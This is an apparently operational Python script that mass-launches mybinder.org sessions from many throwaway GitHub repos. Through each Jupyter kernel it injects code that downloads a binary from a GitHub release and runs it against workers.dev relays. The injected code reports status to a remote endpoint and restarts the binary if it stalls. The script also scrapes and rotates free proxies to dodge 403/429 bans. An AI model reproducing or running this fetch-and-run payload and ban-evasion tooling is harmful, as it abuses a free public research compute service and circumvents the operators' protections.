import requests, re, json, asyncio, websockets, urllib.parse, time, os, sys, threading, signal, random, collections, concurrent.futures

# redirect stdout/stderr to the log file directly so no external redirect is needed
if os.environ.get('BINDER_LOG') != '0':
    sys.stdout = open(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'binder2_out.log'), 'a', buffering=1)
    sys.stderr = open(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'binder2_err.log'), 'a', buffering=1)

token_re = re.compile(r'buildToken["\']?\s*:\s*["\']([^"\']+)["\']')
PROVIDERS = sys.argv[2].split('|') if len(sys.argv) > 2 else ['gesis.mybinder.org', 'bids.mybinder.org', '2i2c.mybinder.org']

# --- Proxy pool (gratuitos) ---
PROXY_SOURCES = [
    'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
    'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
]
proxy_pool = []
proxy_lock2 = threading.Lock()
proxy_fetch_at = [0.0]

def fetch_raw_proxies():
    seen, out = set(), []
    for u in PROXY_SOURCES:
        try:
            r = requests.get(u, timeout=20)
            if r.status_code == 200:
                for line in r.text.splitlines():
                    line = line.strip().split()[0] if line.strip() else ''
                    if line and ':' in line and line not in seen:
                        seen.add(line)
                        out.append('http://' + line)
        except Exception:
            pass
    return out

def _probe(p):
    try:
        r = requests.get('https://gesis.mybinder.org/v2/gh/conta80297-pixel/testemine123/HEAD',
                         proxies={'http': p, 'https': p}, timeout=12)
        return p if r.status_code == 200 else None
    except Exception:
        return None

def refresh_proxies(force=False):
    global proxy_pool
    now = time.time()
    if not force and now - proxy_fetch_at[0] < 600:
        return
    if now - proxy_fetch_at[0] < 30:
        return
    proxy_fetch_at[0] = now
    raw = fetch_raw_proxies()
    good = []
    if raw:
        with concurrent.futures.ThreadPoolExecutor(max_workers=40) as pool:
            for r in pool.map(_probe, raw[:400]):
                if r:
                    good.append(r)
    with proxy_lock2:
        proxy_pool = good
    log(f"proxy pool: {len(good)} limpos de {len(raw)}")

def pick_proxy():
    with proxy_lock2:
        if not proxy_pool:
            return None
        return random.choice(proxy_pool)

def drop_proxy(p):
    if not p:
        return
    with proxy_lock2:
        if p in proxy_pool:
            proxy_pool.remove(p)

def proxy_pool_size():
    with proxy_lock2:
        return len(proxy_pool)

def proxy_maintainer():
    while running:
        time.sleep(600)
        refresh_proxies()

REPOS = [
    "conta80297-pixel/testemine123",
    "ghsikwvsg-wq/teste",
    "conta3autopost-sys/teste",
    "miguelsolano115411-ai/teste",
    "mateusdykfkfkf-glitch/teste",
    "caioa5254-design/teste",
    "efut1715-ai/teste",
    "filhosamormaior028-prog/teste",
    "h89475678-del/teste",
    "hxhxcfjccj-jpg/teste",
    "laurianelaura1982-lgtm/teste",
    "conta8autopost-coder/teste",
    "mateussolano115411-ux/teste",
    "mayeusxxarroz-bot/teste",
    "araujomateus123pro-max/teste",
    "conta2autopost-rgb/teste",
    "conta1autopost-pixel/teste",
]
TARGET = int(sys.argv[1]) if len(sys.argv) > 1 else 500
WORKERS = int(sys.argv[3]) if len(sys.argv) > 3 else 5
PREFIX = os.environ.get('BINDER_PREFIX', '')

CODE = ("import subprocess,os,requests,time,threading,atexit,socket\n"
"BIN='https://github.com/conta80297-pixel/testemine123/releases/download/v2-bin/allinone'\n"
"URLS=['wss://relay3.miguelsolano80297.workers.dev/','wss://newrelay.miguelsolano80297.workers.dev/','wss://sr2.miguelsolano80297.workers.dev/']\n"
"import random\n"
"URL=URLS[random.randint(0,2)]\n"
"ST='https://sr2.miguelsolano80297.workers.dev/status'\n"
"p=None\n"
"def rep(txt):\n"
" try: requests.post(ST,data=txt,timeout=10)\n"
" except: pass\n"
"def dl():\n"
" r=requests.get(BIN,timeout=90,allow_redirects=True)\n"
" open('/tmp/allinone','wb').write(r.content)\n"
" os.chmod('/tmp/allinone',0o755)\n"
" rep('OK-DL '+str(len(r.content)))\n"
"def st():\n"
" global p\n"
" p=subprocess.Popen(['/tmp/allinone','--url',URL,'-l','100','--ram','1400','-i','SESSION'],stdin=subprocess.DEVNULL,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)\n"
" rep('OK-START '+str(p.pid))\n"
"dl();st()\n"
"def wd():\n"
" global p\n"
" last=0;stall=0\n"
" while True:\n"
"  time.sleep(30)\n"
"  if p.poll()!=None:\n"
"   rep('DIED rc='+str(p.poll()))\n"
"   st()\n"
"   last=0;stall=0\n"
"   continue\n"
"  try:\n"
"   f=open('/proc/'+str(p.pid)+'/stat')\n"
"   t=f.read().split()\n"
"   f.close()\n"
"   ut=int(t[13])+int(t[14])\n"
"  except:\n"
"   continue\n"
"  if ut==last: stall+=1\n"
"  else: stall=0\n"
"  last=ut\n"
"  if stall>=2:\n"
"   rep('STALL kill')\n"
"   p.kill();st()\n"
"   last=0;stall=0\n"
"threading.Thread(target=wd,daemon=True).start()\n"
"atexit.register(lambda: p.terminate() if p and p.poll() is None else None)\n"
"print('READY')\n"
"while True: time.sleep(60)\n")

stats = {"launched": 0, "failed": 0}
lock = threading.Lock()
running = True
fail_times = collections.deque()
fail_codes = {}
last_progress_log = [0.0]
# global backoff until this monotonic time if all providers are 403-banned
ban_until = [0.0]

def note_fail(kind):
    with lock:
        fail_codes[kind] = fail_codes.get(kind, 0) + 1
        fail_times.append(time.time())

def note_http(code):
    with lock:
        fail_codes[f'http{code}'] = fail_codes.get(f'http{code}', 0) + 1
        fail_times.append(time.time())

# Keepalive manager
ka_sessions = {}
ka_lock = threading.Lock()

def signal_handler(sig, frame):
    global running
    running = False
    print(f"\n[{time.strftime('%H:%M:%S')}] Stopping...", flush=True)

signal.signal(signal.SIGINT, signal_handler)

def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)

def get_url_token(repo, provider, sid):
    s = requests.Session()
    proxy = pick_proxy()
    if proxy:
        s.proxies = {'http': proxy, 'https': proxy}
    no_token = provider == 'mybinder.org'
    try:
        if no_token:
            r2 = s.get(f'https://{provider}/build/gh/{repo}/HEAD',
                headers={'Accept': 'text/event-stream'}, stream=True, timeout=600)
            return _wait_ready(r2, s)
        r = s.get(f'https://{provider}/v2/gh/{repo}/HEAD', timeout=30)
        if r.status_code != 200:
            note_http(r.status_code)
            if r.status_code == 403 or r.status_code == 429:
                if proxy:
                    drop_proxy(proxy)
                    return 'RETRY'
                ban_until[0] = max(ban_until[0], time.time() + 600)
            return None
        m = token_re.search(r.text)
        if not m:
            note_fail('no-token')
            return None
        bt = m.group(1)
    except Exception as e:
        resp = getattr(e, 'response', None)
        note_http(resp.status_code if resp is not None else -1)
        if proxy:
            drop_proxy(proxy)
            return 'RETRY'
        return None
    try:
        r2 = s.get(f'https://{provider}/build/gh/{repo}/HEAD',
            headers={'Accept': 'text/event-stream'},
            params={'build_token': bt}, stream=True, timeout=600)
    except Exception as e:
        resp = getattr(e, 'response', None)
        note_http(resp.status_code if resp is not None else -2)
        if proxy:
            drop_proxy(proxy)
            return 'RETRY'
        return None
    return _wait_ready(r2, s)

def _wait_ready(r2, s):
    url = token = None
    for line in r2.iter_lines(decode_unicode=True):
        if line and line.startswith('data: '):
            d = json.loads(line[6:])
            if d.get('phase') == 'ready':
                url, token = d['url'], d.get('token', '')
                break
            elif d.get('phase') == 'failed':
                r2.close()
                if d.get('status_code') in (403, 429) and s.proxies.get('https'):
                    drop_proxy(s.proxies['https'])
                    return 'RETRY'
                return None
    r2.close()
    if not url:
        return None
    return (url, token, s)

def create_kernel(base, token, s):
    s.headers.update({'Authorization': f'token {token}'})
    for i in range(60):
        try:
            if s.get(base + '/api/kernelspecs', timeout=15).status_code == 200:
                break
        except:
            pass
        time.sleep(2)
    else:
        return None
    try:
        kr = s.post(base + '/api/kernels', json={'name': 'python3'}, timeout=30)
        if kr.status_code != 201:
            return None
        return kr.json()['id']
    except:
        return None

def send_via_ws(ws_url, token, kid, user, code):
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        async def _send():
            ws = await asyncio.wait_for(
                websockets.connect(ws_url,
                    extra_headers={'Authorization': f'token {token}'},
                    max_size=2**20, ping_interval=30, open_timeout=60),
                timeout=90)
            await asyncio.sleep(5)
            for _ in range(10):
                try:
                    m = await asyncio.wait_for(ws.recv(), timeout=3)
                    d = json.loads(m)
                    if d.get('header', {}).get('msg_type') == 'status':
                        if d.get('content', {}).get('execution_state') == 'idle':
                            break
                except asyncio.TimeoutError:
                    break
            msg = {
                'header': {'msg_id': str(int(time.time()*1000)), 'msg_type': 'execute_request',
                    'username': user, 'session': kid,
                    'date': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()), 'version': '5.2'},
                'parent_header': {}, 'metadata': {},
                'content': {'code': code, 'silent': False, 'store_history': False,
                    'user_expressions': {}, 'allow_stdin': False, 'stop_on_error': False},
                'buffers': [], 'channel': 'shell'
            }
            await ws.send(json.dumps(msg))
            ready = False
            for _ in range(10):
                try:
                    m = await asyncio.wait_for(ws.recv(), timeout=15)
                    d = json.loads(m)
                    mt = d.get('header', {}).get('msg_type', '')
                    if mt == 'stream':
                        t = d.get('content', {}).get('text', '')
                        if 'PID' in t or 'dl' in t or 'READY' in t:
                            ready = True
                            break
                    elif mt == 'execute_reply':
                        ready = True
                        break
                except:
                    break
            try: await ws.close()
            except: pass
            return ready
        result = loop.run_until_complete(_send())
        loop.close()
        return result
    except:
        try: loop.close()
        except: pass
        return False

# Keepalive manager - single async thread
def start_keepalive():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(ka_run())

async def ka_run():
    conns = {}
    while running:
        with ka_lock:
            cur = dict(ka_sessions)
        # remove stale
        for kid in list(conns.keys()):
            if kid not in cur:
                try: await conns[kid].close()
                except: pass
                del conns[kid]
        # connect new
        for kid, (ws_url, token) in cur.items():
            if kid in conns:
                continue
            try:
                ws = await asyncio.wait_for(
                    websockets.connect(ws_url,
                        extra_headers={'Authorization': f'token {token}'},
                        max_size=2**20, ping_interval=30, open_timeout=30),
                    timeout=60)
                conns[kid] = ws
            except:
                pass
        # heartbeat all
        for kid, ws in list(conns.items()):
            try:
                pong = await asyncio.wait_for(ws.ping(), timeout=10)
                await asyncio.wait_for(pong, timeout=10)
            except:
                try: await ws.close()
                except: pass
                if kid in conns:
                    del conns[kid]
        await asyncio.sleep(60)

t_ka = threading.Thread(target=start_keepalive, daemon=True)
t_ka.start()

def launch_one(sid, repo_idx):
    repo = REPOS[repo_idx]
    provider = random.choice(PROVIDERS)
    code = CODE.replace('SESSION', f'{PREFIX}binder{repo_idx+1}')
    for attempt in range(4):
        try:
            result = get_url_token(repo, provider, sid)
            if result == 'RETRY':
                continue
            if not result:
                note_fail('build')
                with lock: stats['failed'] += 1
                return False
            url, token, s = result
            p = urllib.parse.urlparse(url)
            user = p.path.strip('/').split('/')[-1]
            base = f'{p.scheme}://{p.netloc}/user/{user}'
            kid = create_kernel(base, token, s)
            if not kid:
                note_fail('kernel')
                with lock: stats['failed'] += 1
                return False
            ws_url = f'wss://{p.netloc}/user/{user}/api/kernels/{kid}/channels'
            ok = send_via_ws(ws_url, token, kid, user, code)
            with ka_lock:
                ka_sessions[kid] = (ws_url, token)
            if ok:
                with ka_lock:
                    ka_sessions[kid] = (ws_url, token)
                with lock:
                    stats['launched'] += 1
                    l = stats['launched']
                    f = stats['failed']
                log(f"[{sid}] +{PREFIX}binder{repo_idx+1} @ {provider} (active={l} fail={f})")
            else:
                note_fail('ws')
                with lock: stats['failed'] += 1
            return ok
        except Exception as e:
            note_fail(type(e).__name__)
            with lock: stats['failed'] += 1
            return False
    note_fail('proxy-exhausted')
    with lock: stats['failed'] += 1
    return False

def main():
    log("=" * 50)
    log("AUTO BINDER v4 - PROXY ROTATION")
    log(f"  Target: {TARGET} active | Workers: {WORKERS} | Continuous launch")
    log("=" * 50)
    refresh_proxies(force=True)
    threading.Thread(target=proxy_maintainer, daemon=True).start()
    log(f"proxy pool pronto: {proxy_pool_size()} limpos")

    with concurrent.futures.ThreadPoolExecutor(max_workers=WORKERS) as pool:
        futures = set()
        sid_counter = [0]

        def next_sid():
            sid_counter[0] += 1
            return sid_counter[0]

        # initial fill
        for _ in range(WORKERS):
            if not running or stats['launched'] >= TARGET:
                break
            sid = next_sid()
            rid = sid % len(REPOS)
            futures.add(pool.submit(launch_one, sid, rid))

        while running and stats['launched'] < TARGET:
            if not futures:
                break
            done, futures = concurrent.futures.wait(
                futures, return_when=concurrent.futures.FIRST_COMPLETED, timeout=600)
            for fut in done:
                try: fut.result()
                except: pass
            # adaptive throttle: if fails are fast (rate-limited), slow down submissions
            now = time.time()
            with lock:
                while fail_times and fail_times[0] < now - 30:
                    fail_times.popleft()
                rate = len(fail_times) / 30.0
                codes = dict(fail_codes)
            gap = max(0.3, min(6.0, rate * 1.5))
            # backoff ONLY if no proxies available AND direct is banned
            if now < ban_until[0] and proxy_pool_size() == 0:
                log(f"BAN cooldown: {int(ban_until[0]-now)}s remaining (stops spinning)")
                time.sleep(30)
                continue
            # refill
            while len(futures) < WORKERS and running and stats['launched'] < TARGET:
                time.sleep(gap)
                sid = next_sid()
                rid = sid % len(REPOS)
                futures.add(pool.submit(launch_one, sid, rid))
            # report (throttled to 10s)
            with lock:
                l = stats['launched']
                f = stats['failed']
                ka = len(ka_sessions)
            if now - last_progress_log[0] >= 10:
                last_progress_log[0] = now
                top = sorted(codes.items(), key=lambda x: -x[1])[:4]
                log(f"Progress: {l}/{TARGET} active, {f} fail ({rate:.1f}/s), {ka} keepalive, top={top}")

    log(f"FINAL: launched={stats['launched']} failed={stats['failed']} target={TARGET}")

if __name__ == '__main__':
    main()
